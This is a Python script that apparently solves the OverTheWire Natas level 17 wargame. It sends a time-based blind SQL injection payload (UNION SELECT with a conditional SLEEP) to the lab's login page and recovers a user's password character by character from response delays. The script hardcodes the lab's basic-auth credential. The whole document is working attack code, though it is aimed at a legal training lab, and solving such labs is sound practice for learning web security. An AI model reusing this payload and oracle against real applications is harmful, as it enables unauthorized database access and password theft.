import requests
import string

url = 'http://natas17.natas.labs.overthewire.org/index.php?debug=1'
data_fmt = 'username=natas18" UNION SELECT 1,IF(password LIKE BINARY "{}%", SLEEP(1), null) from users -- -'
basic_auth = ("natas17", "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw")
alphabet = string.ascii_letters + string.digits
successful_query_crib = "This user exists."

def attempt(password_fragment):
    print("Trying", password_fragment)

    response_time = (
        requests.post(
            url,
            data=data_fmt.format(password_fragment),
            auth=basic_auth,
            proxies={"http": "http://127.0.0.1:8080"},
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
            },
        ).elapsed.total_seconds()
    )

    if response_time > 1:
        return True
    return False

def run_password_oracle():
    verified_password = ""

    for i in range(64):
        for character in alphabet:
            if attempt(verified_password + character):
                verified_password += character
                break
            elif character == alphabet[-1]:
                return verified_password

    return verified_password


if __name__ == "__main__":
    print(run_password_oracle())
